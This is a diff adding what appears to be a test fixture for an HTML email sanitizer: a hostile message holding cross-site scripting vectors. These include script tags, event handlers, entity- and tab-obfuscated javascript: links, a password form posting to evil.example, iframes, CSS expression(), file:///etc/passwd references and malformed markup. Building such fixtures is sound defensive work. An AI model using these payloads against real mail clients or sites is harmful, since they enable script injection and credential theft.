@@ -1,0 +1,27 @@
+From: attacker@example.net
+To: victim@example.com
+Subject: Hostile HTML
+Date: Wed, 4 Nov 2026 12:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head><base href="file:///etc/"><meta http-equiv="refresh" content="0;url=https://evil.example">
+<link rel="stylesheet" href="https://evil.example/x.css">
+<script>alert(1)</script><style>/* </style> comment trick */
+.x { color: red } body > div { margin: 0 } html body p.lead { font-weight: bold }
+div{position:absolute;top:-500px} </style></head>
+<body onload="alert(2)" class="mail" style="color:#333">
+<p class="lead" onclick="steal()">Hello <a href="javascript:alert(3)">click</a>
+<a href="java&#x09;script:alert(4)">tab</a> <a href="&#106;avascript:alert(5)">entity</a>
+<a href="https://ok.example/?a=1&amp;b=2">ok</a> <a href="mailto:x@example.com">mail</a></p>
+<iframe src="https://evil.example"><p>inside iframe</p></iframe>
+<object data="x.swf"><p>inside object</p></object>
+<svg><script>alert(6)</script><text>svg text</text></svg>
+<form action="https://evil.example"><input name="password" type="password" value="secret"><button>Send</button></form>
+<img src="/etc/passwd" alt="local file"><img src="file:///etc/passwd"><img src="x" onerror="alert(7)">
+<div style="position: fixed; top: 0">fixed overlay</div>
+<div style="po&#115;ition: fixed">entity fixed</div>
+<p style="width: expression(alert(8))">expression</p>
+</div></div></div></body></html><p>after the end</p>
+<<<>>> & </p> <b>unclosed bold <i>and italic
+<!-- unterminated comment
